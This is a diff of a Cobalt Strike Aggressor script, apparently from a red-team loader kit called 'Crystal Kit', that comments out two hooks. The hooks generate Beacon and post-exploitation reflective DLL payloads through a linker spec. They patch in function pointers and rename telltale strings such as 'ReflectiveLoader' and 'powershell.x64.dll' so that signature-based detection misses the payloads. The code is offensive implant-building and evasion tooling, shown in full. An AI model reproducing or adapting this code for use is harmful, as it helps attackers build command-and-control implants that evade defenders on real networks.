@@ -84,80 +84,80 @@ set BEACON_RDLL_SIZE {
    return "0";
 }
 
-set BEACON_RDLL_GENERATE_LOCAL
-{
-    local ( '$beacon $arch $gmh $gpa $spec_path $spec $hash_map $final' );
+# set BEACON_RDLL_GENERATE_LOCAL
+# {
+#     local ( '$beacon $arch $gmh $gpa $spec_path $spec $hash_map $final' );
 
-    $beacon = $2;
-    $arch   = $3;
-    $gmh    = $5;
-    $gpa    = $6;
+#     $beacon = $2;
+#     $arch   = $3;
+#     $gmh    = $5;
+#     $gpa    = $6;
 
-    if ( $arch eq "x86" )
-    {
-        warn ( "Crystal Kit is x64 only" );
-        return $null;
-    }
+#     if ( $arch eq "x86" )
+#     {
+#         warn ( "Crystal Kit is x64 only" );
+#         return $null;
+#     }
 
-    print_info ( "BEACON_RDLL_GENERATE_LOCAL" );
+#     print_info ( "BEACON_RDLL_GENERATE_LOCAL" );
 
-    $spec_path = getFileProper ( script_resource ( "local-loader" ), "loader.spec" );
-    $spec      = [ LinkSpec Parse: $spec_path ];
+#     $spec_path = getFileProper ( script_resource ( "local-loader" ), "loader.spec" );
+#     $spec      = [ LinkSpec Parse: $spec_path ];
 
-    $hash_map  = [ new HashMap ];
+#     $hash_map  = [ new HashMap ];
 
-    [ $hash_map put: "\$GMH", cast ( $gmh, 'b' ) ];
-    [ $hash_map put: "\$GPA", cast ( $gpa, 'b' ) ];
+#     [ $hash_map put: "\$GMH", cast ( $gmh, 'b' ) ];
+#     [ $hash_map put: "\$GPA", cast ( $gpa, 'b' ) ];
 
-    $final = [ $spec run: $beacon, $hash_map ];
+#     $final = [ $spec run: $beacon, $hash_map ];
 
-    if ( strlen ( $final ) == 0 )
-    {
-        warn ( "Failed to build payload" );
-        return $null;
-    }
+#     if ( strlen ( $final ) == 0 )
+#     {
+#         warn ( "Failed to build payload" );
+#         return $null;
+#     }
 
-    return $final;
-}
+#     return $final;
+# }
 
-set POSTEX_RDLL_GENERATE
-{ 
-    local ( '$postex $arch $gmh $gpa $spec_path $spec $hash_map $final' );
+# set POSTEX_RDLL_GENERATE
+# { 
+#     local ( '$postex $arch $gmh $gpa $spec_path $spec $hash_map $final' );
    
-    $postex = $2;
-    $arch   = $3;
-    $gmh    = $5;
-    $gpa    = $6;
+#     $postex = $2;
+#     $arch   = $3;
+#     $gmh    = $5;
+#     $gpa    = $6;
 
-    if ( $arch eq "x86" )
-    {
-        warn ( "Crystal Kit is x64 only" );
-        return $null;
-    }
+#     if ( $arch eq "x86" )
+#     {
+#         warn ( "Crystal Kit is x64 only" );
+#         return $null;
+#     }
 
-    print_info ( "POSTEX_RDLL_GENERATE" );
+#     print_info ( "POSTEX_RDLL_GENERATE" );
 
-    $postex = strrep_pad ( $postex, "w/hr", "err" );
-    $postex = strrep_pad ( $postex, "[-]", "[!]" );
-    $postex = strrep_pad ( $postex, "ReflectiveLoader", "legitLoader" );
-    $postex = strrep_pad ( $postex, "invokeassembly.x64.dll", "revokeassembly.x64.dll" );
-    $postex = strrep_pad ( $postex, "powershell.x64.dll", "weakshell.x64.dll" );
+#     $postex = strrep_pad ( $postex, "w/hr", "err" );
+#     $postex = strrep_pad ( $postex, "[-]", "[!]" );
+#     $postex = strrep_pad ( $postex, "ReflectiveLoader", "legitLoader" );
+#     $postex = strrep_pad ( $postex, "invokeassembly.x64.dll", "revokeassembly.x64.dll" );
+#     $postex = strrep_pad ( $postex, "powershell.x64.dll", "weakshell.x64.dll" );
 
-    $spec_path = getFileProper ( script_resource ( "postex-loader" ), "loader.spec" );
-    $spec      = [ LinkSpec Parse: $spec_path ];
+#     $spec_path = getFileProper ( script_resource ( "postex-loader" ), "loader.spec" );
+#     $spec      = [ LinkSpec Parse: $spec_path ];
 
-    $hash_map  = [ new HashMap ];
+#     $hash_map  = [ new HashMap ];
 
-    [ $hash_map put: "\$GMH", cast ( $gmh, 'b' ) ];
-    [ $hash_map put: "\$GPA", cast ( $gpa, 'b' ) ];
+#     [ $hash_map put: "\$GMH", cast ( $gmh, 'b' ) ];
+#     [ $hash_map put: "\$GPA", cast ( $gpa, 'b' ) ];
 
-    $final = [ $spec run: $postex, $hash_map ];
+#     $final = [ $spec run: $postex, $hash_map ];
 
-    if ( strlen ( $final ) == 0 )
-    {
-       warn ( "Failed to build package" );
-       return $null;
-    }
+#     if ( strlen ( $final ) == 0 )
+#     {
+#        warn ( "Failed to build package" );
+#        return $null;
+#     }
 
-    return $final;
-}
+#     return $final;
+# }
